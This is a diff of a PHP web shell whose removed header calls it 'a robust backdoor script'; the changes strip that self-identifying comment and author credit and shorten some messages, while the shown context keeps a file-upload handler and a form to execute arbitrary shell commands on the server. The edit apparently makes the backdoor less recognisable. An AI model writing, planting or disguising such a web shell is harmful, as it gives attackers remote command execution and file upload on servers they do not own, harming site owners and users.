@@ -1,6 +1,4 @@
 <?php 
-// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.com/ [3-15-2011] 
-// This code is public domain and may be used in part or in full for any legal purpose. I would still appreciate a mention though :).
 
 function isLinux($path) 
 { 
@@ -236,7 +234,7 @@ elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
             }  
             else 
             { 
-                echo "Error copying file, likely a permission error."; 
+                echo "Error copying file, permission error."; 
             } 
         } 
     } 
@@ -260,7 +258,7 @@ elseif(isset($_REQUEST['uploadForm']) || isset($_FILES["file_name"]))
 elseif(isset($_REQUEST['cc'])) 
 { 
     setcookie("uploadDir",$_GET["dir"]); 
-    echo "You are OK to upload the file, don't upload files to other directories before completing this upload.";
+    echo "You are OK to upload the file.";
 } 
 elseif(isset($_REQUEST['mquery'])) 
 { 
@@ -425,4 +423,4 @@ PHP Version: <?php echo PHP_VERSION ?><br />
 <pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off') ?>): <input type="text" name="c"><input type="submit" value="Go"></form>  
 <?php 
 } 
-//Intentionally left open to avoid output the file download function 1
+
